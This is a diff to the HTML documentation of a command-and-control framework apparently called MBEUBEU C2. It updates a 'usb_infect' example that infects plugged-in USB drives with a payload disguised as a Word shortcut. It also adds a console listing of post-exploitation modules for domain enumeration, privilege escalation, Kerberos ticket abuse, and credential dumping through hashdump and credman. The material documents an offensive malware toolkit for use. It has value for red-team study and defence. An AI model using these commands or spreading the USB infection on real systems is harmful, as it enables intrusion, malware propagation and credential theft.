@@ -268,7 +268,7 @@
       <code>usb_infect</code><br><br>
       USB Propagation: This command monitors plugged-in USB devices and automatically infects them.<br>
 You only need to provide a <code>payload.exe</code> file and a document file. It will then create hidden files along with a <code>.lnk</code> file that uses the same icon as Microsoft Word.<br><br>
-      <pre>usb_infect Ndobin.exe invoice.docx 60</pre>
+      <pre>usb_infect Ndobin.exe invoice.docx NoSuspectName 60</pre>
     </div>
 
     <div class="step">
@@ -290,6 +290,66 @@ You only need to provide a <code>payload.exe</code> file and a document file. It
       <div class="logo-container">
                 <img src="screenshots/bofa.png" alt="MBEUBEU C2 " class="screenshot">
      </div>
+	 <p>
+	 [💀 bayefall (DIENG | 2025-09-29-10-33-08) ] > bof_execute
+
+BOF Situational Awareness :
+================================
+enum_whoami                     Enumerate current user privileges
+enum_localusers                 Enumerate local user accounts
+enum_domaingroups               Enumerate domain groups
+enum_localgroups                Enumerate local groups
+enum_domainusers                Enumerate domain user accounts
+enum_domaingroupmembers         Enumerate domain group memberships
+enum_arpscan                    Enumerate local network using ARP scan
+enum_services                   Enumerate running and stopped services
+enum_firewallrules              List configured Windows Firewall rules
+enum_routeprint                 Display network routes
+enum_sessioninfo                Get session and login info
+enum_localsessions              Enumerate local user sessions
+enum_schtasks                   List scheduled tasks
+enum_notpad                     Show notepad contents
+enum_listdns                    List DNS
+enum_azure_ad_joininfo                   Enum Azure AD Info
+enum_env                        Show environdment varibales
+enum_resources                  Show Resources
+enum_ipconfig                   Show IP configuration
+enum_netstat                    Display network connections
+enum_adcs                       Enumerate AD CS Certificate Templates and configuration
+
+BOF Local Privilege Escalation :
+====================================
+priv_unquoted                   Find unquoted service paths for privilege escalation
+priv_modifiableautorun          Detect user-modifiable autoruns
+priv_tokenprivileges            Display token privileges
+priv_alwaysinstallelevated      Check AlwaysInstallElevated settings
+
+BOF Kerberos Abuse :
+======================
+rubeus_asktgt                   Request a TGT for a user/password
+rubeus_asktgs                   Request TGS ticket from TGT
+rubeus_asreproasting            Enumerate users vulnerable to AS-REP roasting
+rubeus_cross_s4u                Perform cross-domain S4U2self + S4U2proxy
+rubeus_dump                     Dump Kerberos tickets from memory
+rubeus_kerberoasting            Request TGS tickets for Kerberoasting
+rubeus_ptt                      Pass-the-Ticket: Inject Kerberos tickets
+rubeus_renew                    Renew TGT using Rubeus
+rubeus_tgtdeleg                 Extract TGT from TGT delegation context
+rubeus_changepw                 Change user password via Kerberos
+rubeus_describe                 Describe ticket content
+rubeus_hash                     Calculate Kerberos-compatible password hashes
+rubeus_klist                    List Kerberos tickets
+rubeus_purge                    Delete all Kerberos tickets)
+rubeus_s4u                      S4U constrained delegation
+rubeus_triage                   Summarize Kerberos tickets and session info
+
+BOF Credentials  :
+======================
+askcreds                        Prompt for Credentials
+autologon                       Registry autologon information
+credman                         Windows Credential Manager saved web passwords
+hashdump                        Dump SAM Hashes
+	 </p>
      <div class="logo-container">
                 <img src="screenshots/bof.png" alt="MBEUBEU C2 " class="screenshot">
      </div>
